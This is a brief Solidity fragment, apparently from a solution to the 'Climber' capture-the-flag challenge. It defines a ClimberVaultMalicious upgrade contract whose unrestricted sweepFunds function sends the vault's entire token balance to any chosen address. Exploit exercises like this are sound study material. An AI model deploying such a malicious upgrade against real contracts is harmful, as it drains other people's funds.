 ...
 */
contract ClimberVaultMalicious is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    ...
    function sweepFunds(address token, address destination) external {
        SafeTransferLib.safeTransfer(token, destination, IERC20(token).balanceOf(address(this)));
    }
